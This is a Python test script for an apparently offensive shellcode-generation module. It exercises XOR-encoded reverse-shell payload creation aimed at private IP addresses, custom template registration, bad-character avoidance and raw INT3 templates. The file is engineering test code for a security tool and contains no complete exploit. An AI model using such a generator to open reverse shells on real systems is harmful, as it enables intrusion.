"""
Test the refactored shellcode module structure.

This script validates that the new modular shellcode implementation works correctly
before we switch over from the old monolithic file.
"""

import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from ofx.api.shellcode import OSShellcodes

def test_xor_encoding():
    """Test XOR encoding"""
    print("=" * 60)
    print("TEST: XOR encoding")
    print("=" * 60)

    sc = OSShellcodes("linux", "x86", "10.0.0.1", 8080)
    payload = sc.create_shellcode(
        shellcode_type="reverse", encode="xor", encode_key=0xAA, debug=1
    )

    print(f"Generated {len(payload)} bytes of encoded shellcode")
    print(f"First 20 bytes: {payload[:20].hex()}")
    assert len(payload) > 0, "Encoded shellcode should not be empty"
    print("✓ XOR encoding works\n")


def test_custom_template():
    """Test custom template registration"""
    print("=" * 60)
    print("TEST: Custom template registration")
    print("=" * 60)

    import struct

    def my_custom_shell(ip: str, port: int) -> bytes:
        """Custom shellcode template"""
        ip_bytes = bytes(map(int, ip.split(".")))
        port_bytes = struct.pack(">H", port)
        return b"\x90" * 10 + ip_bytes + port_bytes

    # Register custom template
    OSShellcodes.register_custom_template("linux", "x64", "custom", my_custom_shell)

    # List templates
    templates = OSShellcodes.list_custom_templates()
    print(f"Registered templates: {templates}")
    assert "LINUX_X64_custom" in templates, "Custom template should be registered"

    # Use custom template
    sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
    payload = sc.create_shellcode(shellcode_type="custom", debug=1)

    print(f"Generated {len(payload)} bytes from custom template")
    print(f"Payload: {payload.hex()}")
    assert payload[:10] == b"\x90" * 10, "Should start with NOPs"
    assert payload[10:14] == bytes([192, 168, 1, 100]), "Should contain IP"

    # Clean up
    OSShellcodes.unregister_custom_template("linux", "x64", "custom")
    print("✓ Custom template works\n")


def test_bad_chars():
    """Test bad character detection"""
    print("=" * 60)
    print("TEST: Bad character detection")
    print("=" * 60)

    sc = OSShellcodes(
        "linux", "x64", "192.168.1.100", 4444, bad_chars=["\\x00", "\\x0a"]
    )
    payload = sc.create_shellcode(shellcode_type="reverse", debug=1)

    # Check if any bad chars present
    has_nulls = b"\x00" in payload
    has_newlines = b"\x0a" in payload

    print(f"Payload length: {len(payload)}")
    print(f"Contains null bytes: {has_nulls}")
    print(f"Contains newlines: {has_newlines}")
    print("✓ Bad char detection works\n")


def test_custom_raw_bytes():
    """Test custom raw bytes template"""
    print("=" * 60)
    print("TEST: Custom raw bytes template")
    print("=" * 60)

    # Register raw bytes
    raw_payload = b"\xcc" * 20  # INT3 instructions
    OSShellcodes.register_custom_template("windows", "x86", "int3", raw_payload)

    sc = OSShellcodes("windows", "x86", "0.0.0.0", 0)
    payload = sc.create_shellcode(shellcode_type="int3", debug=1)

    print(f"Generated {len(payload)} bytes from raw bytes template")
    assert payload == raw_payload, "Should use exact raw bytes"

    # Clean up
    OSShellcodes.clear_custom_templates()
    print("✓ Raw bytes template works\n")
